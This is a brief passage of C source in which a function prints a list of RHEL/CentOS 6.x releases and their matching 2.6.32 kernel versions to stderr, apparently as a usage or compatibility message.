	fprintf (stderr, "    RHEL/CentOS 6.4  kernel-2.6.32-358.x\n");
	fprintf (stderr, "    RHEL/CentOS 6.3  kernel-2.6.32-279.x\n");
	fprintf (stderr, "    RHEL/CentOS 6.2  kernel-2.6.32-220.x\n");
	fprintf (stderr, "    RHEL/CentOS 6.1  kernel-2.6.32-131.x\n");
	fprintf (stderr, "    RHEL/CentOS 6.0  kernel-2.6.32-71.x\n");
}
